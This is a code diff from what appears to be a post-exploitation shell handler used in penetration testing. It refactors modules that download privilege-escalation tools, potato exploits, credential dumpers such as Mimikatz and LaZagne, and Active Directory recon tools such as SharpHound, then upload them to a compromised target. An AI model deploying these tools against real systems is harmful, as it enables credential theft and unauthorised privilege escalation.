@@ -4484,57 +4484,99 @@ class Module:
 
 class upload_privesc_scripts(Module):
 	category = "Privilege Escalation"
+
 	def run(session, args):
 		"""
-		Upload {linpeas, lse, deepce, pspy || winpeas, powerup, privesccheck}
+		Upload specific privesc tools {linpeas, lse, deepce, pspy || winpeas, powerup, privesccheck}, If no tool is specified, all available tools are uploaded.
+		Example:
+			upload_privesc_scripts winpeas
+			upload_privesc_scripts linpeas pspy64
 		"""
 		if not session.write_access(session.cwd):
 			return
 
+		requested = args.split() if args else []
+		
 		if session.OS == 'Unix':
-			session.upload(URLS['linpeas'])
-			session.upload(URLS['lse'])
-			session.upload(URLS['deepce'])
-
-			if session.arch == "x86_64":
-				session.upload(URLS['pspy64'])
-			elif session.arch in ("i386", "i686"):
-				session.upload(URLS['pspy32'])
-			else:
-				logger.error("pspy: No compatible binary architecture")
-				print()
-
+			tools = {
+				"linpeas": lambda: session.upload(URLS['linpeas']),
+				"lse": lambda: session.upload(URLS['lse']),
+				"deepce": lambda: session.upload(URLS['deepce']),
+				"pspy": lambda: (
+					session.upload(URLS['pspy64']) if session.arch == "x86_64"
+					else session.upload(URLS['pspy32']) if session.arch in ("i386", "i686")
+					else logger.error("pspy: No compatible binary architecture \n")
+				)
+			}
+		
 		elif session.OS == 'Windows':
-			session.upload(URLS['winpeas_bat'])
-			session.upload(URLS['winpeas_any'])
-			session.upload(URLS['powerup'])
-			session.upload(URLS['privesccheck'])
+			tools = {
+				"winpeas": lambda: session.upload(URLS['winpeas_any']),
+				"winpeas_bat": lambda: session.upload(URLS['winpeas_bat']),
+				"powerup": lambda: session.upload(URLS['powerup']),
+				"privesccheck": lambda: session.upload(URLS['privesccheck']),
+			}
+
+		if not requested:
+			logger.info("No tools specified, uploading all")
+			requested = list(tools.keys())
+
+		for tool in requested:
+			
+			if session.OS == 'Unix' and tool in ["winpeas", "winpeas_bat", "powerup", "privesccheck"]:
+				logger.warning(f"{tool} is not available on Unix targets")
+				continue
+			if session.OS == 'Windows' and tool in ["linpeas", "lse", "deepce", "pspy"]:
+				logger.warning(f"{tool} is not available on Windows targets")
+				continue
+			if tool not in tools:
+				logger.error(f"Unknown tool: {tool}")
+				continue
+			try:
+				tools[tool]()
+			except Exception as e:
+				logger.error(f"Failed to upload {tool}: {e}")
 
 
 class potato(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
 		"""
-		Upload the latest version of {GodPotato, SigmaPotato, PrintSpoofer}
+		Upload the latest version of {GodPotato, SigmaPotato, PrintSpoofer}, If no tool is specified, all available tools are uploaded.
+		Example:
+			potato GodPotato
 		"""
 		if not session.write_access(session.cwd):
 			return
+		
+		requested = args.split() if args else []
 
 		if session.OS == "Unix":
 			logger.error("This module runs only on Windows shells")
 		elif session.OS == "Windows":
-			session.upload(URLS['godpotato'])
-			session.upload(URLS['sigmapotato'])
+			tools = {
+				"GodPotato": lambda: session.upload(URLS['godpotato']),
+				"SigmaPotato": lambda: session.upload(URLS['sigmapotato']),
+				"PrintSpoofer": lambda: (
+					session.upload(URLS['printspoofer64']) if session.arch == "x64-based_PC"
+					else session.upload(URLS['printspoofer32']) if session.arch == "x86-based_PC"
+					else logger.error("PrintSpoofer: No predefined binary to upload")
+				),
+			}
+		else:
+			logger.error(f"Unsupported OS: {session.OS}")
+		if not requested:
+			logger.info("No tools specified, uploading all")
+			requested = list(tools.keys())
 
-			if session.arch == "x64-based_PC":
-				session.upload(URLS['printspoofer64'])
-			elif session.arch == "x86-based_PC":
-				session.upload(URLS['printspoofer32'])
-			else:
-				logger.error("printspoofer: No predefined binary to upload.")
-				print()
-				return
-
+		for tool in requested:
+			if tool not in tools:
+				logger.error(f"Unknown tool: {tool}")
+				continue
+			try:
+				tools[tool]()
+			except Exception as e:
+				logger.error(f"Failed to upload {tool}: {e}")
 
 class peass_ng(Module):
 	category = "Privilege Escalation"
@@ -4652,62 +4694,99 @@ class upload_credump_scripts(Module):
 	category = "Credential Dumping"
 	def run(session, args):
 		"""
-		Upload Mimikatz, LaZagne, Snaffler, SharpWeb to the Windows target
+		Upload Specific Credential Dumping tools {Mimikatz, LaZagne, Snaffler, SharpWeb} to the Windows target, If no tool is specified, all available tools are uploaded.
 		"""
 		if not session.write_access(session.cwd):
 			return
-
+		
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
+		if session.OS == 'Windows':	
+			requested = [t.lower() for t in args.split()] if args else []
 
-		elif session.OS == 'Windows':
-			import tempfile
-			_, archive = url_to_bytes(URLS['mimikatz'])
-			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-				target = Path(tmpdir) / "mimikatz"
-				target.mkdir(parents=True, exist_ok=True)
-				with zipfile.ZipFile(io.BytesIO(archive)) as z:
-					z.extractall(target)
-					session.upload(str(target))
+			def upload_mimikatz():
+				import tempfile
+				_, archive = url_to_bytes(URLS['mimikatz'])
+				with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+					target = Path(tmpdir) / "mimikatz"
+					target.mkdir(parents=True, exist_ok=True)
+					with zipfile.ZipFile(io.BytesIO(archive)) as z:
+						z.extractall(target)
+						session.upload(str(target))
 
-			session.upload(URLS['lazagne'])
-			session.upload(URLS['snaffler'])
-			session.upload(URLS['sharpweb'])
+			tools = {
+				"mimikatz": upload_mimikatz,
+				"lazagne": lambda : session.upload(URLS['lazagne']),
+				"snaffler": lambda : session.upload(URLS['snaffler']),
+				"sahrpweb": lambda : session.upload(URLS['sharpweb'])
+			}
+
+			if not requested:
+				logger.info("No tools specified, uploading all")
+				requested = list(tools.keys())
+
+			for tool in requested:
+				if tool not in tools:
+					logger.error(f"Unknown tool: {tool}")
+					continue
+				try:
+					tools[tool]()
+				except Exception as e:
+					logger.error(f"Failed to upload {tool}: {e}")			
 
 
 class upload_ad_scripts(Module):
 	category = "Active Directory"
 	def run(session, args):
 		"""
-		Upload Powerview, SharpHound, GhostPack collection to the Windows target
+		Upload specific AD tools {PowerView, SharpHound, GhostPack}. If no tool is specified, all available tools are uploaded.
 		"""
 		if not session.write_access(session.cwd):
 			return
 
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
+		if session.OS == 'Windows':
+			requested = [t.lower() for t in args.split()] if args else []
+			
+			def upload_sharphound():
+				import tempfile
+				_, archive = url_to_bytes(URLS['sharphound'])
+				with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+					target = Path(tmpdir) / "sharphound"
+					target.mkdir(parents=True, exist_ok=True)
+					with zipfile.ZipFile(io.BytesIO(archive)) as z:
+						z.extractall(target)
+						session.upload(str(target))
+			def upload_ghostpack():
+				import tempfile
+				_, archive = url_to_bytes(URLS['ghostpack'])
+				with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+					with zipfile.ZipFile(io.BytesIO(archive)) as z:
+						z.extractall(tmpdir)
+						extracted_folder = list(Path(tmpdir).iterdir())[0]
+						renamed_folder = extracted_folder.parent / "ghostpack"
+						os.rename(extracted_folder, renamed_folder)
+						session.upload(str(renamed_folder))
+			tools = {
+				"powerview": lambda: session.upload(URLS['powerview']),
+				"sharphound": upload_sharphound,
+				"ghostpack": upload_ghostpack,
+			}
 
-		elif session.OS == 'Windows':
-			session.upload(URLS['powerview'])
+			if not requested:
+				logger.info("No tools specified, uploading all")
+				requested = list(tools.keys())
 
-			import tempfile
-			_, archive = url_to_bytes(URLS['sharphound'])
-			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-				target = Path(tmpdir) / "sharphound"
-				target.mkdir(parents=True, exist_ok=True)
-				with zipfile.ZipFile(io.BytesIO(archive)) as z:
-					z.extractall(target)
-					session.upload(str(target))
+			for tool in requested:
+				if tool not in tools:
+					logger.error(f"Unknown tool: {tool}")
+					continue
+				try:
+					tools[tool]()
+				except Exception as e:
+					logger.error(f"Failed to upload {tool}: {e}")
 
-			import tempfile
-			_, archive = url_to_bytes(URLS['ghostpack'])
-			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-				with zipfile.ZipFile(io.BytesIO(archive)) as z:
-					z.extractall(tmpdir)
-					extracted_folder = list(Path(tmpdir).iterdir())[0]
-					renamed_folder = extracted_folder.parent / "ghostpack"
-					os.rename(extracted_folder, renamed_folder)
-					session.upload(str(renamed_folder))
 
 
 class uac(Module):
